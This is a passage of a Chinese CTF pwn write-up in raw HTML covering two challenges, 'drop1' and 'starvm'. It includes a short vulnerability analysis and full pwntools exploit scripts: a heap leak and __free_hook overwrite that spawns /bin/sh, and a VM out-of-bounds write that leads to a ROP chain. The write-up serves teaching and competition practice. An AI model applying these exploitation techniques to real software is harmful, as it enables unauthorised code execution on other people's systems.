class="line"><span class="function"><span class="title">ru</span><span class="params">(<span class="string">&quot;The 1th item: \n&quot;</span>)</span></span></span><br><span class="line"><span class="function">leak_addr </span>= u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2a70</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+hex(heap_base))</span><br><span class="line"></span><br><span class="line">bubble(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">ru(<span class="string">&quot;The 8th item: \n&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
<ul>
<li>上面这个堆风水就是猜出来的，遇到这种不好分析的题目一定不要执着于逆向，要适当猜测数据</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./drop1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;item:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble</span>(<span class="params">key,idx</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;West/East?&quot;</span>,<span class="built_in">str</span>(key))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i+<span class="number">1</span>)*<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">bubble(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;The 1th item: \n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2a70</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">bubble(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">ru(<span class="string">&quot;The 8th item: \n&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i+<span class="number">1</span>)*<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">bubble(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">add(p64(system).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">bubble(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="starvm"><a href="#starvm" class="headerlink" title="starvm"></a>starvm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.1</span>)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">starvm: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=f7648c6285dbb9299e6ee84f7b48f53de6626be6, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序的核心结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Chunk struc ; (<span class="keyword">sizeof</span>=<span class="number">0x7C</span>, mappedto_9)</span><br><span class="line"><span class="number">00000000</span> cmd_listp dq ?                          ; offset</span><br><span class="line"><span class="number">00000008</span> next dq ?                               ; offset</span><br><span class="line"><span class="number">00000010</span> field_10 dq ?</span><br><span class="line"><span class="number">00000018</span> data_list dq ?                          ; offset</span><br><span class="line"><span class="number">00000020</span> data1 dq ?                              ; offset</span><br><span class="line"><span class="number">00000028</span> data2 dq ?                              ; offset</span><br><span class="line"><span class="number">00000030</span> cmd_list dq ?                           ; offset</span><br><span class="line"><span class="number">00000038</span> answer dd <span class="number">14</span> dup(?)</span><br><span class="line"><span class="number">00000070</span> answer_addr dq ?                        ; offset</span><br><span class="line"><span class="number">00000078</span> answer2 dd ?</span><br><span class="line"><span class="number">0000007</span>C Chunk ends</span><br></pre></td></tr></table></figure>
<p>在 <code>case-10</code> 中没有 offset 检查，可以溢出到核心结构体中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">10</span>:                                <span class="comment">// lea</span></span><br><span class="line">  indext = index;</span><br><span class="line">  ++cmd_list;</span><br><span class="line">  index += <span class="number">2</span>;</span><br><span class="line">  chunk-&gt;answer[chunk-&gt;data_list[indext]] = chunk-&gt;data_list[indext + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">12</span>:                                <span class="comment">// lea3</span></span><br><span class="line">  data1 = chunk-&gt;data1;</span><br><span class="line">  indext = index;</span><br><span class="line">  ++cmd_list;</span><br><span class="line">  ++index;</span><br><span class="line">  chunk-&gt;answer[chunk-&gt;data_list[indext]] = *(data1 - <span class="number">1</span>);</span><br><span class="line">  chunk-&gt;data1 = data1 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>由于程序是提供了 stack_addr 的，通过程序的溢出，可以将 answer_addr 覆盖为 stack_addr，然后就可以修改栈上的数据了</p>
<p>劫持栈，利用 puts 泄露 libc_base，然后写 main 函数地址循环执行程序：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&quot;your vm starts at &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>)) </span><br><span class="line">stack_base = leak_addr - <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;stack_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">stack_addr1 = (stack_base) % <span class="number">0x100000000</span></span><br><span class="line">stack_addr2 = (stack_base &gt;&gt; <span class="number">32</span>) % <span class="number">0x100000000</span></span><br><span class="line">main_addr = <span class="number">0x4012B0</span></span><br><span class="line">puts_got = <span class="number">0x401240</span></span><br><span class="line">printf_got = <span class="number">0x404018</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004017cb</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;command:&quot;</span>,<span class="string">&quot;10 10 10 10 10 10 7 7 7 7 7 7 7 16&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;your cost:&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;14&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(stack_addr1))</span><br><span class="line">sl(<span class="string">&quot;15&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(stack_addr2))</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(puts_got))</span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(pop_rdi_ret))</span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(printf_got))</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(main_addr))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;7&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0xDEADBEEF</span>))</span><br></pre></td></tr></table></figure>
<p>最后在栈上覆盖一个 ROP 就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./starvm1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\nb* 0x4017CC\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x4018B6\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">ru(<span class="string">&quot;your vm starts at &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>)) </span><br><span class="line">stack_base = leak_addr - <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;stack_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">stack_addr1 = (stack_base) % <span class="number">0x100000000</span></span><br><span class="line">stack_addr2 = (stack_base &gt;&gt; <span class="number">32</span>) % <span class="number">0x100000000</span></span><br><span class="line">main_addr = <span class="number">0x4012B0</span></span><br><span class="line">puts_got = <span class="number">0x401240</span></span><br><span class="line">printf_got = <span class="number">0x404018</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004017cb</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x00000000004016f0</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;command:&quot;</span>,<span class="string">&quot;10 10 10 10 10 10 7 7 7 7 7 7 7 16&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;your cost:&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;14&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(stack_addr1))</span><br><span class="line">sl(<span class="string">&quot;15&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(stack_addr2))</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(puts_got))</span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(pop_rdi_ret))</span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(printf_got))</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(main_addr))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span 